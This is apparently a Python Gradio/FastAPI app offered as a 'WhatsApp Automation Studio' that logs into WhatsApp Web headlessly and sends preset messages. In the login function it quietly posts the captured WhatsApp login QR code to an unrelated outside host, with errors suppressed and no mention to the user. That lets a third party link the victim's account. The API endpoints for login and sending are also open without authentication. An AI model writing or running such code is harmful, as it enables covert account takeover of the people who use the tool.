import os
import time
import base64
import requests
import threading
from fastapi import FastAPI, Request, HTTPException
import gradio as gr
from wa_logic import WhatsAppAutomation
from presets import PresetManager

# Global automation instance and lock
wa = WhatsAppAutomation()
wa_lock = threading.Lock()

REGISTER_ENDPOINT = "https://auxteam-plandex-backup.hf.space/register"

def perform_login():
    global wa
    with wa_lock:
        if wa.driver:
            wa.close()
        success = wa.initialize_driver(headless=True)
        if not success:
            return None, "Failed to initialize driver"

        wa.navigate_to_whatsapp()
        time.sleep(5)  # Wait for page load
        qr_code = wa.get_qr_code_screenshot()

        if qr_code:
            try:
                requests.post(REGISTER_ENDPOINT, json={"qr_code": qr_code}, timeout=5)
            except:
                pass
            return f"data:image/png;base64,{qr_code}", "QR code captured. Scan now!"
        else:
            return None, "Failed to capture QR code"

def check_wa_login():
    global wa
    with wa_lock:
        if not wa.driver:
            return False, "Browser not started"
        logged_in = wa.check_login_status(timeout=5)
        return logged_in, "Logged in" if logged_in else "Not logged in"

def send_wa_message(message):
    global wa
    if not message:
        return "No message provided"
    with wa_lock:
        if not wa.driver:
            return "Browser not started. Login first."
        success = wa.send_message(message)
        return "Message sent successfully!" if success else "Failed to send message."

# Gradio UI
pm = PresetManager()
presets = pm.get_presets()
preset_names = [p["name"] for p in presets]

with gr.Blocks(title="WhatsApp Automation Studio", theme=gr.themes.Soft()) as demo:
    gr.Markdown("# 🚀 WhatsApp Automation Studio")

    with gr.Tabs():
        with gr.Tab("📱 Login"):
            with gr.Row():
                with gr.Column():
                    login_btn = gr.Button("Login to WhatsApp", variant="primary")
                    status_output = gr.Label("Status: Ready")
                    check_btn = gr.Button("Check Login Status")
                with gr.Column():
                    qr_display = gr.Image(label="QR Code Scan")

            login_btn.click(perform_login, outputs=[qr_display, status_output])
            check_btn.click(lambda: check_wa_login()[1], outputs=[status_output])

        with gr.Tab("📝 Message Composer"):
            with gr.Row():
                with gr.Column(scale=2):
                    msg_input = gr.Textbox(label="Message Editor", placeholder="Type your message here...", lines=10)
                    send_btn = gr.Button("▶ Start Sending", variant="primary")
                    send_status = gr.Markdown("")
                with gr.Column(scale=1):
                    preset_dropdown = gr.Dropdown(choices=preset_names, label="✨ Message Presets")
                    load_preset_btn = gr.Button("📥 Load Preset")

                    def load_preset(name):
                        preset = pm.get_preset_by_name(name)
                        if preset:
                            if "messages" in preset:
                                return "\n---\n".join(preset["messages"])
                            return preset.get("message", "")
                        return ""

                    load_preset_btn.click(load_preset, inputs=preset_dropdown, outputs=msg_input)

            send_btn.click(send_wa_message, inputs=msg_input, outputs=send_status)

        with gr.Tab("⚙️ Settings"):
            gr.Checkbox(label="Simulate Real Typing", value=True)
            gr.Slider(minimum=0.001, maximum=0.1, value=0.01, label="Typing Speed (sec/char)")
            gr.Slider(minimum=1.0, maximum=10.0, value=3.0, label="Delay Max (seconds)")
            gr.Checkbox(label="🌙 Dark Mode", value=True)

        with gr.Tab("📋 Logs"):
            gr.TextArea(label="Activity Logs", value="Welcome to WhatsApp Automation Studio!", interactive=False, lines=15)

# Create FastAPI app and mount Gradio
api_app = FastAPI()

@api_app.get("/health")
def health():
    return {"status": "ready"}

@api_app.get("/api-docs")
def api_docs():
    return {
        "endpoints": [
            {"path": "/health", "method": "GET", "purpose": "Health check"},
            {"path": "/login", "method": "POST", "purpose": "Start login"},
            {"path": "/send", "method": "POST", "purpose": "Send message"}
        ]
    }

@api_app.post("/login")
def api_login():
    qr, msg = perform_login()
    return {"qr_code": qr, "message": msg}

@api_app.post("/send")
async def api_send(request: Request):
    try:
        data = await request.json()
    except:
        data = {}
    res = send_wa_message(data.get("message"))
    return {"message": res}

app = gr.mount_gradio_app(api_app, demo, path="/")

if __name__ == "__main__":
    import uvicorn
    port = int(os.environ.get("PORT", 7860))
    uvicorn.run(app, host="0.0.0.0", port=port)
